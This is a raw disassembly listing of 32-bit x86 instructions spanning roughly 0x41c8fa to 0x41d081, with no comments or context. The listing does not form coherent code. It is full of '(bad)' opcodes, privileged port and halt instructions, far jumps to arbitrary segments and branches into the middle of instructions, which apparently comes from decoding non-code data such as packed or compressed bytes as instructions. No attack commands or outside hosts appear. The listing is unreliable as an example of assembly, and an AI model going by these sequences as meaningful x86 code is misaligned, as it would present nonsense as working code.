  41c8fa:	shl    BYTE PTR [ebx+edi*4-0x62],1
  41c8fe:	pop    ss
  41c8ff:	ret    
  41c900:	sbb    DWORD PTR [eax-0x73],0x1ebc3c67
  41c907:	jmp    0x1002:0xdce12f
  41c90e:	inc    esi
  41c90f:	xor    al,0xe5
  41c911:	rol    DWORD PTR ds:0xaf16fb9d,cl
  41c917:	xchg   edi,eax
  41c918:	xchg   ecx,eax
  41c919:	xchg   DWORD PTR [edx],ebp
  41c91b:	mov    ebp,ecx
  41c91d:	nop
  41c91e:	outs   dx,BYTE PTR ds:[esi]
  41c91f:	jecxz  0x41c8f6
  41c921:	lea    ebp,[ebx-0x714afda9]
  41c927:	lods   eax,DWORD PTR ds:[esi]
  41c928:	jecxz  0x41c995
  41c92a:	pop    ds
  41c92b:	mov    fs,WORD PTR ds:0xd7819a1d
  41c931:	je     0x41c90d
  41c933:	imul   esp,DWORD PTR [edx],0xffffffa9
  41c936:	clc    
  41c937:	ss iret 
  41c939:	xor    esp,DWORD PTR [ebx+0x3d510f2f]
  41c93f:	scas   al,BYTE PTR es:[edi]
  41c940:	add    ah,bl
  41c942:	sub    BYTE PTR [eax],dl
  41c944:	adc    eax,0xa37b6e19
  41c949:	add    DWORD PTR [esi],0x1e
  41c94c:	mov    bh,0xf8
  41c94e:	dec    eax
  41c94f:	ret    
  41c950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c951:	pop    edx
  41c952:	inc    edi
  41c953:	imul   ecx,ebx,0x3d46048f
  41c959:	(bad)  
  41c95b:	dec    esi
  41c95c:	xor    eax,esp
  41c95e:	cmp    al,0x1f
  41c960:	outs   dx,DWORD PTR ds:[esi]
  41c961:	mov    ah,0x64
  41c963:	nop
  41c964:	cli    
  41c965:	pop    eax
  41c966:	dec    esp
  41c967:	inc    ebp
  41c968:	or     al,0x7b
  41c96a:	jnp    0x41c933
  41c96c:	push   cs
  41c96d:	fisttp QWORD PTR [ecx]
  41c96f:	mov    bl,0xea
  41c971:	in     eax,0xeb
  41c973:	and    BYTE PTR [ebx+0x67709771],0xe4
  41c97a:	fs pop ecx
  41c97c:	addr16 inc eax
  41c97e:	mov    dh,BYTE PTR [ebp+edi*4+0x58092964]
  41c985:	xor    ax,0x1b1
  41c989:	out    0xed,eax
  41c98b:	jo     0x41c99f
  41c98d:	inc    esp
  41c98e:	push   eax
  41c98f:	xor    al,0xe
  41c991:	dec    ebp
  41c992:	add    edx,DWORD PTR ds:0xa3421b9b
  41c998:	inc    edx
  41c999:	jno    0x41c927
  41c99b:	push   ds
  41c99c:	out    0x56,al
  41c99e:	fcom   QWORD PTR [eax]
  41c9a0:	ds jmp 0x68334a40
  41c9a6:	fstp   st(3)
  41c9a8:	fmul   QWORD PTR [ebp-0x69982c5]
  41c9ae:	dec    ebx
  41c9af:	aam    0xe7
  41c9b1:	repz sahf 
  41c9b3:	push   eax
  41c9b4:	jb     0x41c937
  41c9b6:	scas   eax,DWORD PTR es:[edi]
  41c9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9b8:	aam    0x69
  41c9ba:	leave  
  41c9bb:	lods   al,BYTE PTR ds:[esi]
  41c9bc:	mov    ds:0xb3a54bb8,al
  41c9c1:	or     DWORD PTR [ebp+0x1323f9d1],0x548bb45f
  41c9cb:	hlt    
  41c9cc:	or     al,0x11
  41c9ce:	shr    BYTE PTR [ecx],0x4a
  41c9d1:	stc    
  41c9d2:	add    edx,esp
  41c9d4:	stos   BYTE PTR es:[edi],al
  41c9d5:	sub    bh,dl
  41c9d7:	lods   eax,DWORD PTR ds:[esi]
  41c9d8:	push   esi
  41c9d9:	scas   al,BYTE PTR es:[edi]
  41c9da:	sub    eax,0xe6d05c04
  41c9df:	mov    edx,0x77460aa
  41c9e4:	dec    esi
  41c9e5:	mov    esp,0xa31431ff
  41c9ea:	aam    0xa4
  41c9ec:	mov    al,0xed
  41c9ee:	push   esp
  41c9ef:	icebp  
  41c9f0:	shr    DWORD PTR [esi],1
  41c9f2:	add    eax,0x46f7829d
  41c9f7:	mov    esi,0x65aa52b9
  41c9fc:	test   ch,bl
  41c9fe:	mov    al,0x6b
  41ca00:	rcr    DWORD PTR [ebx-0x2a9b504e],cl
  41ca06:	fcomp  QWORD PTR [eax]
  41ca08:	mov    eax,0xee3380d2
  41ca0d:	sbb    eax,0x3e036a62
  41ca12:	add    BYTE PTR [ecx-0xd],0xdf
  41ca16:	ret    0x5bf4
  41ca19:	in     eax,0x2a
  41ca1b:	dec    esp
  41ca1c:	shl    DWORD PTR [esi+0x6e],1
  41ca1f:	jae    0x41ca5a
  41ca21:	add    DWORD PTR [ecx],eax
  41ca23:	icebp  
  41ca24:	jecxz  0x41ca61
  41ca26:	fwait
  41ca27:	sub    al,0xe5
  41ca29:	jbe    0x41caa1
  41ca2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca2c:	hlt    
  41ca2d:	xchg   esi,eax
  41ca2e:	aaa    
  41ca2f:	out    0x73,al
  41ca31:	sub    BYTE PTR [edx+0x4632d212],0x58
  41ca38:	popa   
  41ca39:	jb     0x41ca4f
  41ca3b:	cwde   
  41ca3c:	popa   
  41ca3d:	push   0xffffffdf
  41ca3f:	mov    esi,0xab1837b
  41ca44:	xor    DWORD PTR [eax+0x55],esp
  41ca47:	sub    ax,0x858e
  41ca4b:	inc    esp
  41ca4c:	add    al,0x92
  41ca4e:	adc    bh,ah
  41ca50:	sahf   
  41ca51:	pop    ds
  41ca52:	pop    ebp
  41ca53:	push   esi
  41ca54:	push   0x73
  41ca56:	add    DWORD PTR [esi-0x2d],ecx
  41ca59:	pop    ecx
  41ca5a:	dec    esp
  41ca5b:	fwait
  41ca5c:	or     bl,BYTE PTR ds:0xe98f6c20
  41ca62:	ret    0xf31e
  41ca65:	cmp    bh,BYTE PTR [ebp-0x51d96f6e]
  41ca6b:	call   0xf06ce270
  41ca70:	imul   ebp,ecx,0x1f
  41ca73:	push   edi
  41ca74:	sbb    DWORD PTR [edi-0x26],esp
  41ca77:	nop
  41ca78:	jle    0x41ca68
  41ca7a:	sbb    dl,bh
  41ca7c:	mov    ecx,0x9400b37
  41ca81:	inc    edx
  41ca82:	mov    al,0x6a
  41ca84:	addr16 cld 
  41ca86:	xchg   esi,eax
  41ca87:	dec    ecx
  41ca88:	ja     0x41ca5c
  41ca8a:	cwde   
  41ca8b:	mov    eax,ds:0x35dedf93
  41ca90:	jnp    0x41ca56
  41ca92:	mov    cl,0x64
  41ca94:	aam    0x1b
  41ca96:	mov    dh,dh
  41ca98:	jmp    0x3411d185
  41ca9d:	fiadd  WORD PTR [eax+0x7b0f4560]
  41caa3:	sub    BYTE PTR [ecx+0x4c],bh
  41caa6:	call   0xd59e:0xb41206fd
  41caad:	test   eax,0xf01a7f6e
  41cab2:	push   ecx
  41cab3:	mov    DWORD PTR [esi-0x2262d422],eax
  41cab9:	pushf  
  41caba:	mov    eax,DWORD PTR [eax-0x6b]
  41cabd:	push   0x6f534685
  41cac2:	test   BYTE PTR [edx],cl
  41cac4:	ins    BYTE PTR es:[edi],dx
  41cac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac6:	sub    al,0x36
  41cac8:	cwde   
  41cac9:	xchg   edx,eax
  41caca:	and    DWORD PTR [ebx+ecx*8],edi
  41cacd:	pop    ecx
  41cace:	rep stos DWORD PTR es:[edi],eax
  41cad0:	dec    edi
  41cad1:	mov    dh,0x10
  41cad3:	(bad)  
  41cad5:	cmp    cl,BYTE PTR [edx]
  41cad7:	sahf   
  41cad8:	adc    al,0xd8
  41cada:	hlt    
  41cadb:	xor    al,0xf1
  41cadd:	popf   
  41cade:	repnz push 0xffffffaf
  41cae1:	std    
  41cae2:	push   ds
  41cae3:	cwde   
  41cae4:	mov    ah,0xe9
  41cae6:	jg     0x41cad3
  41cae8:	dec    ecx
  41cae9:	sub    eax,0x42a6def
  41caee:	push   cs
  41caef:	fwait
  41caf0:	cli    
  41caf1:	xor    BYTE PTR es:[ecx-0x2b4a51bc],0xe7
  41caf9:	lods   eax,DWORD PTR ds:[esi]
  41cafa:	cmc    
  41cafb:	mov    ds:0x35fb9fed,al
  41cb00:	push   es
  41cb01:	pushf  
  41cb02:	fwait
  41cb03:	or     al,0xd5
  41cb05:	mov    edx,0xea678be3
  41cb0a:	test   al,0x1
  41cb0c:	xor    al,0xf8
  41cb0e:	jnp    0x41caeb
  41cb10:	pop    esi
  41cb11:	sbb    BYTE PTR [edx-0x1e156067],cl
  41cb17:	inc    edx
  41cb18:	dec    edx
  41cb19:	inc    edi
  41cb1a:	jp     0x41cb91
  41cb1c:	and    ecx,esp
  41cb1e:	add    esi,esi
  41cb20:	mov    esp,0x23a0af92
  41cb25:	pop    esp
  41cb26:	push   cs
  41cb27:	pushf  
  41cb28:	cmp    ebp,DWORD PTR [ebx+edi*4]
  41cb2b:	out    0x9,al
  41cb2d:	test   eax,0xc732e95f
  41cb32:	scas   al,BYTE PTR es:[edi]
  41cb33:	out    0x44,eax
  41cb35:	not    dl
  41cb37:	in     eax,0x0
  41cb39:	xchg   ebx,eax
  41cb3a:	adc    bl,ch
  41cb3c:	mov    es,WORD PTR [ecx]
  41cb3e:	mov    eax,ds:0x8800d4de
  41cb43:	and    al,0x21
  41cb45:	and    ah,ch
  41cb47:	sahf   
  41cb48:	loopne 0x41cb50
  41cb4a:	xchg   edi,eax
  41cb4b:	pushf  
  41cb4c:	dec    esp
  41cb4d:	pop    ebx
  41cb4e:	stos   DWORD PTR es:[edi],eax
  41cb4f:	mul    BYTE PTR [ebx-0x5f6e5a8f]
  41cb55:	mov    ?,WORD PTR [eax-0xf51f3b6]
  41cb5b:	stc    
  41cb5c:	sbb    cl,BYTE PTR [ecx+0x784ffd9f]
  41cb62:	mov    bl,0x6d
  41cb64:	cmp    DWORD PTR [edi],ebp
  41cb66:	pop    es
  41cb67:	retf   0xe546
  41cb6a:	icebp  
  41cb6b:	adc    bh,BYTE PTR [ebp+0x57968f7e]
  41cb71:	adc    al,0xb1
  41cb73:	mov    eax,ds:0xbb2eba21
  41cb78:	pop    edx
  41cb79:	sub    eax,0x505f86cc
  41cb7e:	lods   al,BYTE PTR ds:[esi]
  41cb7f:	test   eax,0x2176b892
  41cb84:	sub    esp,edi
  41cb86:	lahf   
  41cb87:	add    eax,DWORD PTR [ecx-0x1f153b47]
  41cb8d:	dec    edi
  41cb8e:	jl     0x41cb18
  41cb90:	jmp    0x8841:0xcb8d68c5
  41cb97:	(bad)  
  41cb98:	jne    0x41cc0f
  41cb9a:	enter  0xe43e,0x9b
  41cb9e:	mov    eax,ds:0x4aa043ec
  41cba3:	rol    DWORD PTR [eax-0x4f],0xcd
  41cba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cba8:	jno    0x41cc1a
  41cbaa:	jnp    0x41cbd1
  41cbac:	mov    edi,0x6ce81757
  41cbb1:	push   es
  41cbb2:	mov    ds:0xca08d4a3,al
  41cbb7:	gs fs cdq 
  41cbba:	pusha  
  41cbbb:	cmp    esp,DWORD PTR [esi-0x4ac7296]
  41cbc1:	aam    0x5f
  41cbc3:	and    al,0xa4
  41cbc5:	sub    ch,BYTE PTR [ebx+edi*8+0x53]
  41cbc9:	mov    BYTE PTR [ebp+0x3a2211ec],ch
  41cbcf:	cs sub al,0xa8
  41cbd2:	cdq    
  41cbd3:	js     0x41cbfb
  41cbd5:	mov    ebp,0x329fa10f
  41cbda:	sbb    BYTE PTR [ebx-0x136f8bcf],ah
  41cbe0:	xlat   BYTE PTR ds:[ebx]
  41cbe1:	add    ch,BYTE PTR [ebp-0x39fa84a2]
  41cbe7:	pop    ecx
  41cbe8:	in     al,0x1c
  41cbea:	mov    edi,0xc613f8db
  41cbef:	mov    ds:0x8d49b0e5,eax
  41cbf4:	cmp    eax,0xdcec405c
  41cbf9:	enter  0xc1ee,0x25
  41cbfd:	dec    edi
  41cbfe:	mov    eax,ds:0xc9d11f6a
  41cc03:	jo     0x41cc5e
  41cc05:	outs   dx,BYTE PTR ds:[esi]
  41cc06:	movzx  ecx,BYTE PTR [edi+0x38]
  41cc0a:	mov    ds:0x65fef45f,eax
  41cc0f:	push   ebp
  41cc10:	ins    DWORD PTR es:[edi],dx
  41cc11:	pushf  
  41cc12:	sub    BYTE PTR [ebx+0xeb3b46f],dh
  41cc18:	mov    esi,0x6a449c04
  41cc1d:	jp     0x41cbac
  41cc1f:	aaa    
  41cc20:	mov    al,ds:0xd39d999c
  41cc25:	ins    DWORD PTR es:[edi],dx
  41cc26:	leave  
  41cc27:	add    DWORD PTR [esi],0xffffff91
  41cc2a:	lock mov ah,al
  41cc2d:	or     edx,DWORD PTR [ebx-0x79ab0bb6]
  41cc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc34:	jne    0x41cbee
  41cc36:	aad    0xf
  41cc38:	sub    eax,DWORD PTR [ebp-0x6e0125d7]
  41cc3e:	call   0x42c9:0x25967089
  41cc45:	js     0x41ccc5
  41cc47:	pop    edx
  41cc48:	sub    ebx,DWORD PTR [esi]
  41cc4a:	out    dx,al
  41cc4b:	xor    DWORD PTR [edx+0xb],ecx
  41cc4e:	int3   
  41cc4f:	adc    eax,0x172aac1e
  41cc54:	imul   eax,DWORD PTR [eax+0x4cc83106],0x38
  41cc5b:	push   ecx
  41cc5c:	and    ecx,DWORD PTR [eax]
  41cc5e:	dec    edx
  41cc5f:	cmp    al,0xd6
  41cc61:	and    eax,0x70173f82
  41cc66:	jne    0x41cc3b
  41cc68:	sbb    eax,0x1ac953f1
  41cc6d:	dec    esi
  41cc6e:	mov    al,0x60
  41cc70:	dec    edi
  41cc71:	into   
  41cc72:	fiadd  DWORD PTR [ebp+0x7d]
  41cc75:	test   al,0x5a
  41cc77:	outs   dx,DWORD PTR ds:[esi]
  41cc78:	or     ah,bh
  41cc7a:	cmp    al,0xd6
  41cc7c:	xlat   BYTE PTR ds:[ebx]
  41cc7d:	mov    dh,0x14
  41cc7f:	ins    DWORD PTR es:[edi],dx
  41cc80:	out    dx,eax
  41cc81:	jae    0x41cc47
  41cc83:	lahf   
  41cc84:	mov    DWORD PTR [ebx+0x7a],eax
  41cc87:	or     esp,DWORD PTR [ebx+0x1831ddfb]
  41cc8d:	je     0x41cc5a
  41cc8f:	and    bl,BYTE PTR [ecx+0x4ed56b42]
  41cc95:	iret   
  41cc96:	pop    ecx
  41cc97:	and    ecx,ebx
  41cc99:	fisub  DWORD PTR [ecx]
  41cc9b:	or     al,BYTE PTR [edi+ecx*8]
  41cc9e:	jg     0x41cc40
  41cca0:	and    DWORD PTR [ecx],0x8e28a975
  41cca6:	xchg   esi,eax
  41cca7:	jo     0x41ccb3
  41cca9:	stos   BYTE PTR es:[edi],al
  41ccaa:	and    al,0x2f
  41ccac:	mov    al,0x95
  41ccae:	and    DWORD PTR [edi-0xc390d0],edx
  41ccb4:	dec    edi
  41ccb5:	pushf  
  41ccb6:	dec    edi
  41ccb7:	cmp    ch,BYTE PTR [esi+0x24c29378]
  41ccbd:	lahf   
  41ccbe:	(bad)  
  41ccbf:	mov    bl,0xf3
  41ccc1:	repnz ffree st(5)
  41ccc4:	adc    edi,edx
  41ccc6:	out    dx,eax
  41ccc7:	mov    edx,0x5bd75a82
  41cccc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ccce:	push   ss
  41cccf:	xor    BYTE PTR [ebp+0x59],bl
  41ccd2:	jge    0x41cc56
  41ccd4:	push   esp
  41ccd5:	outs   dx,DWORD PTR ds:[esi]
  41ccd6:	fcom   DWORD PTR [edi+0x2a]
  41ccd9:	xchg   ebx,eax
  41ccda:	mov    ds:0x2eb23e2c,al
  41ccdf:	xor    eax,0xf9fd735f
  41cce4:	ja     0x41ccc5
  41cce6:	lock fisttp DWORD PTR [di-0x3a]
  41cceb:	mov    dh,0xab
  41cced:	mov    al,ds:0xa1157bcb
  41ccf2:	sahf   
  41ccf3:	jl     0x41cd26
  41ccf5:	mov    ebp,0xa243e701
  41ccfa:	push   0xc249be02
  41ccff:	shr    BYTE PTR [ecx+0x12],cl
  41cd02:	push   edx
  41cd03:	out    0xa8,eax
  41cd05:	pushf  
  41cd06:	pop    ss
  41cd07:	cmp    al,dh
  41cd09:	inc    edx
  41cd0a:	outs   dx,BYTE PTR ds:[esi]
  41cd0b:	in     eax,0x82
  41cd0d:	push   edi
  41cd0e:	mov    cl,0x3
  41cd10:	lods   eax,DWORD PTR ds:[esi]
  41cd11:	outs   dx,DWORD PTR ds:[esi]
  41cd12:	rcr    BYTE PTR [eax],1
  41cd14:	pop    esi
  41cd15:	out    0x9,al
  41cd17:	je     0x41cd6c
  41cd19:	sub    ecx,0xbe3eb4b5
  41cd1f:	ret    0x7db2
  41cd22:	inc    esp
  41cd23:	aas    
  41cd24:	adc    bh,ch
  41cd26:	outs   dx,BYTE PTR ds:[esi]
  41cd27:	stos   BYTE PTR es:[di],al
  41cd29:	dec    ebx
  41cd2a:	lahf   
  41cd2b:	pop    es
  41cd2c:	mov    ecx,0xd2d0cf80
  41cd31:	and    dh,BYTE PTR [edx+edx*2-0x203ab655]
  41cd38:	das    
  41cd39:	cdq    
  41cd3a:	cdq    
  41cd3b:	lods   al,BYTE PTR ds:[esi]
  41cd3c:	push   esi
  41cd3d:	jecxz  0x41cd5b
  41cd3f:	jle    0x41cdb2
  41cd41:	ds jae 0x41cd3f
  41cd44:	push   es
  41cd45:	xor    BYTE PTR [ecx+0x33c15566],al
  41cd4b:	or     DWORD PTR [ebx-0x50a95562],0x57b82d67
  41cd55:	jle    0x41cdbd
  41cd57:	cmp    DWORD PTR [eax-0x63],edx
  41cd5a:	lahf   
  41cd5b:	adc    dl,bl
  41cd5d:	jbe    0x41cd4b
  41cd5f:	sbb    eax,0xdb396ce9
  41cd64:	mov    ch,0x98
  41cd66:	retf   0x3d30
  41cd69:	outs   dx,BYTE PTR ds:[esi]
  41cd6a:	inc    esp
  41cd6b:	sub    ebx,0xfffffff3
  41cd6e:	push   0xcf3709e9
  41cd73:	xchg   BYTE PTR [edi-0x2dd92ecb],bl
  41cd79:	mov    dh,0x2d
  41cd7b:	cdq    
  41cd7c:	cmp    DWORD PTR [esi+0x5371972],edx
  41cd82:	pop    esi
  41cd83:	repz fimul DWORD PTR [eax+0xa]
  41cd87:	fistp  QWORD PTR [ebp+0x5885b2cf]
  41cd8d:	xchg   esp,eax
  41cd8e:	rcl    BYTE PTR gs:[edx+0x392b1935],cl
  41cd95:	mov    dl,0x8e
  41cd97:	mov    eax,fs:0xcba52eb7
  41cd9d:	sbb    DWORD PTR [eax+0x1c],esp
  41cda0:	xchg   DWORD PTR [eax-0x38],esp
  41cda3:	enter  0x7db4,0x12
  41cda7:	jge    0x41cddc
  41cda9:	mov    eax,ds:0xca11687f
  41cdae:	cwde   
  41cdaf:	xchg   esi,eax
  41cdb0:	jo     0x41cd47
  41cdb2:	sbb    eax,0x5cd2424e
  41cdb7:	ja     0x41cd61
  41cdb9:	add    edx,edx
  41cdbb:	push   0xe5bb3d6d
  41cdc0:	mov    ds:0x3d69c1,eax
  41cdc5:	jge    0x41cd7a
  41cdc7:	dec    eax
  41cdc8:	fwait
  41cdc9:	push   ds
  41cdca:	cmp    bl,dl
  41cdcc:	push   ecx
  41cdcd:	push   edx
  41cdce:	lock mov edi,DWORD PTR [esi+0x20]
  41cdd2:	mov    ebp,0xc65d6e63
  41cdd7:	mov    DWORD PTR [ebx+eax*4+0x2e965e50],ecx
  41cdde:	jnp    0x41cdca
  41cde0:	xchg   esi,eax
  41cde1:	and    edx,edx
  41cde3:	adc    eax,ebx
  41cde5:	mov    edx,0x6487a8aa
  41cdea:	loop   0x41ce52
  41cdec:	ss je  0x41cddd
  41cdef:	fs pushf 
  41cdf1:	pushfw 
  41cdf3:	xor    eax,0xecb852ac
  41cdf8:	fsub   DWORD PTR [ebp-0x6a]
  41cdfb:	aad    0x5a
  41cdfd:	mov    ebx,0x7b4cff90
  41ce02:	mov    ds:0x4a101d32,eax
  41ce07:	lods   eax,DWORD PTR ds:[esi]
  41ce08:	dec    ebx
  41ce09:	test   eax,0x184c6a77
  41ce0e:	jp     0x41cddf
  41ce10:	ins    BYTE PTR es:[edi],dx
  41ce11:	and    DWORD PTR [ecx-0x2d],esp
  41ce14:	mov    ecx,0xd3aea555
  41ce19:	dec    DWORD PTR [ebp+0x4c]
  41ce1c:	mov    edi,ds
  41ce1e:	lods   al,BYTE PTR ds:[esi]
  41ce1f:	mov    al,ds:0xa4dad3be
  41ce24:	nop
  41ce25:	and    BYTE PTR [esi-0x23118053],cl
  41ce2b:	mov    BYTE PTR [ecx],dl
  41ce2d:	sub    BYTE PTR [esi+0xf],dh
  41ce30:	inc    ecx
  41ce31:	xchg   ebx,eax
  41ce32:	(bad)  
  41ce34:	(bad)  
  41ce35:	addr16 adc al,0x5c
  41ce38:	push   esp
  41ce39:	inc    esi
  41ce3a:	aad    0x25
  41ce3c:	pusha  
  41ce3d:	std    
  41ce3e:	push   esp
  41ce3f:	mov    DWORD PTR [ecx+esi*2+0x59],ecx
  41ce43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce44:	mov    ds:0x2f422539,al
  41ce49:	jb     0x41cde2
  41ce4b:	lods   eax,DWORD PTR ds:[esi]
  41ce4c:	jmp    DWORD PTR [ebp+edx*8+0x2a426ce]
  41ce53:	xchg   esp,eax
  41ce54:	xchg   edi,eax
  41ce55:	mov    bh,BYTE PTR [edx+0x724c9fc6]
  41ce5b:	or     BYTE PTR [edi+eiz*1+0x6e],dl
  41ce5f:	pop    ds
  41ce60:	test   al,0x3b
  41ce62:	hlt    
  41ce63:	xchg   ebp,eax
  41ce64:	or     DWORD PTR [edx-0x68310989],0xffffffa1
  41ce6b:	aas    
  41ce6c:	and    eax,0x5648a7c8
  41ce71:	add    DWORD PTR [eax],0x10
  41ce74:	mov    dl,0x94
  41ce76:	fbstp  TBYTE PTR [esi-0x7b]
  41ce79:	mov    bh,0x12
  41ce7b:	popa   
  41ce7c:	data16 fnstsw WORD PTR [ecx+ebp*2-0x16b441ef]
  41ce84:	sub    ah,cl
  41ce86:	or     ebx,DWORD PTR [edx]
  41ce88:	movd   DWORD PTR [esi],mm6
  41ce8b:	inc    edx
  41ce8c:	and    DWORD PTR [edi-0x50],ecx
  41ce8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce90:	enter  0x129e,0xa3
  41ce94:	les    edi,FWORD PTR [eax]
  41ce96:	popf   
  41ce97:	cmc    
  41ce98:	pop    edi
  41ce99:	mov    esi,0x392869c9
  41ce9e:	sbb    BYTE PTR [esi+0x13],dl
  41cea1:	mov    ebx,0x5b72dffd
  41cea6:	ds adc ch,ah
  41cea9:	ret    0x204d
  41ceac:	(bad)  
  41ceae:	inc    edx
  41ceaf:	test   eax,0x58c32133
  41ceb4:	ror    BYTE PTR ds:[esi],1
  41ceb7:	xchg   ecx,eax
  41ceb8:	ror    ebp,0x59
  41cebb:	pop    edi
  41cebc:	in     al,dx
  41cebd:	bound  ebp,QWORD PTR [edx-0x4e34f1f]
  41cec3:	outs   dx,DWORD PTR ds:[esi]
  41cec4:	mov    ecx,0x8d8d1e1b
  41cec9:	mov    eax,ds:0x92c7dc12
  41cece:	sub    eax,0x801d1ff6
  41ced3:	rol    ebp,1
  41ced5:	sub    DWORD PTR [edx+edi*1+0x53],ebx
  41ced9:	jb     0x41cf1b
  41cedb:	xor    edx,DWORD PTR [edx-0x76907b9a]
  41cee1:	int3   
  41cee2:	inc    eax
  41cee3:	mov    eax,0x583b8b51
  41cee8:	pop    edi
  41cee9:	sub    ch,BYTE PTR [eax]
  41ceeb:	xchg   ebp,eax
  41ceec:	loope  0x41cf02
  41ceee:	push   ecx
  41ceef:	mov    ds:0xb50a5041,al
  41cef4:	retf   0x8697
  41cef7:	repnz fwait
  41cef9:	test   ecx,ebx
  41cefb:	push   ecx
  41cefc:	out    dx,eax
  41cefd:	neg    DWORD PTR [ebp-0x5f]
  41cf00:	add    BYTE PTR [edx-0x31fae550],dh
  41cf06:	pushf  
  41cf07:	adc    al,0x84
  41cf09:	out    0x84,eax
  41cf0b:	sbb    eax,0x2a39531b
  41cf10:	pop    es
  41cf11:	push   es
  41cf12:	in     al,0x28
  41cf14:	(bad)  
  41cf15:	rol    BYTE PTR [edi+0x2efffb30],0x74
  41cf1c:	dec    ebp
  41cf1d:	sub    DWORD PTR [eax-0x1fa6e746],0x24
  41cf24:	ret    0xf39d
  41cf27:	retf   0xf44
  41cf2a:	push   ebx
  41cf2b:	sbb    BYTE PTR [eax-0x5e5ec951],bl
  41cf31:	icebp  
  41cf32:	jle    0x41cfb2
  41cf34:	call   0xe962f3de
  41cf39:	addr16 call 0x30a1fa9b
  41cf3f:	add    ch,BYTE PTR [esi]
  41cf41:	fmul   DWORD PTR [eax+ebp*4+0x73cd1aec]
  41cf48:	lods   eax,DWORD PTR ds:[esi]
  41cf49:	jmp    0x41cf61
  41cf4b:	or     eax,0x1bc38381
  41cf50:	pop    ds
  41cf51:	sti    
  41cf52:	pop    ss
  41cf53:	mov    ebp,0x2c2547ff
  41cf58:	ja     0x41cf97
  41cf5a:	loop   0x41cf8f
  41cf5c:	arpl   WORD PTR [esi+0x169921aa],di
  41cf62:	ins    BYTE PTR es:[edi],dx
  41cf63:	push   ebx
  41cf64:	sub    al,0x2e
  41cf66:	and    BYTE PTR [ecx-0x12],bl
  41cf69:	mov    ds:0x3dc35149,al
  41cf6e:	inc    eax
  41cf6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf70:	int3   
  41cf71:	jle    0x41cff0
  41cf73:	test   ah,bh
  41cf75:	mov    eax,ds:0x118ed06c
  41cf7a:	lods   al,BYTE PTR ds:[esi]
  41cf7b:	cdq    
  41cf7c:	call   0x588c4598
  41cf81:	fsubr  DWORD PTR [ebx-0x1a]
  41cf84:	shl    BYTE PTR [ebx],1
  41cf86:	sub    BYTE PTR [ebp-0xc97f768],bl
  41cf8c:	sbb    ebp,DWORD PTR ds:0x8f397e92
  41cf92:	inc    edi
  41cf93:	iret   
  41cf94:	push   edx
  41cf95:	fcomp  st(1)
  41cf97:	ss pusha 
  41cf99:	retf   
  41cf9a:	xor    eax,0x8e48ff6b
  41cf9f:	xchg   BYTE PTR [esp+ecx*4],cl
  41cfa2:	lods   al,BYTE PTR ds:[esi]
  41cfa3:	adc    eax,0xbc8e0594
  41cfa8:	cmp    DWORD PTR [ebp-0x12],esp
  41cfab:	sbb    al,0xa4
  41cfad:	inc    eax
  41cfae:	add    ebp,ebp
  41cfb0:	jmp    0x18d6f9ce
  41cfb5:	arpl   WORD PTR [ecx-0x62],cx
  41cfb8:	xchg   esi,eax
  41cfb9:	dec    esp
  41cfba:	jmp    0x74c05edb
  41cfbf:	out    0xea,al
  41cfc1:	or     esi,DWORD PTR [ecx-0x1430c5a]
  41cfc7:	out    dx,al
  41cfc8:	or     eax,0x6e98dec6
  41cfcd:	mov    eax,ds:0x581a29ee
  41cfd2:	push   ebx
  41cfd3:	idiv   BYTE PTR [eax+0x7d]
  41cfd6:	scas   al,BYTE PTR es:[edi]
  41cfd7:	mov    ds:0x8f17a47f,al
  41cfdc:	jl     0x41cfbf
  41cfde:	mov    BYTE PTR [ebx+0x7ba8a8d],ah
  41cfe4:	and    eax,0xe48f935f
  41cfe9:	cmc    
  41cfea:	add    BYTE PTR [ebx+0x71],al
  41cfed:	fs inc eax
  41cfef:	and    BYTE PTR [ecx+0x2b69329a],al
  41cff5:	leave  
  41cff6:	xchg   ebp,eax
  41cff7:	jmp    0x41d076
  41cff9:	adc    DWORD PTR [ebp-0x2699af11],esi
  41cfff:	cmp    al,0xb4
  41d001:	(bad)  
  41d002:	ror    DWORD PTR [ebx],cl
  41d004:	(bad)  
  41d005:	aad    0x64
  41d007:	stos   DWORD PTR es:[edi],eax
  41d008:	(bad)  
  41d009:	jns    0x41cfd4
  41d00b:	inc    ecx
  41d00c:	push   0x4c26147d
  41d011:	sbb    edx,esp
  41d013:	or     al,0x1
  41d015:	jp     0x41d080
  41d017:	push   esp
  41d018:	jnp    0x41d07e
  41d01a:	push   ss
  41d01b:	or     al,dl
  41d01d:	cs aas 
  41d01f:	shl    ebx,cl
  41d021:	mov    ebx,0xeae13eb4
  41d026:	and    BYTE PTR [ebp+0x22],dh
  41d029:	push   ebx
  41d02a:	inc    esi
  41d02b:	nop
  41d02c:	(bad)  
  41d02d:	rcl    BYTE PTR [edx-0x79d25d45],1
  41d033:	loop   0x41d012
  41d035:	mov    bl,0xf9
  41d037:	mov    DWORD PTR [ecx+edi*1+0x3],0x8bcd5759
  41d03f:	dec    edx
  41d040:	inc    edi
  41d041:	rcr    BYTE PTR [edi+0x86f701c],1
  41d047:	js     0x41d02a
  41d049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04a:	sahf   
  41d04b:	sahf   
  41d04c:	addr16 jbe 0x41d084
  41d04f:	out    0x65,eax
  41d051:	in     al,dx
  41d052:	sbb    bl,BYTE PTR [edi+ebx*4]
  41d055:	mov    edi,0xd9a8df3c
  41d05a:	enter  0x79ef,0x47
  41d05e:	retf   0xef0e
  41d061:	and    dl,BYTE PTR [ebx]
  41d063:	(bad)  
  41d064:	in     al,0x4b
  41d066:	jmp    0xa5ab:0xafec4bcf
  41d06d:	pop    edi
  41d06e:	aam    0x98
  41d070:	enter  0x41bb,0x2e
  41d074:	js     0x41d014
  41d076:	nop
  41d077:	add    bl,al
  41d079:	push   ecx
  41d07a:	sbb    DWORD PTR [edx],edx
  41d07c:	mov    eax,0x63700348
  41d081:	push   ebx
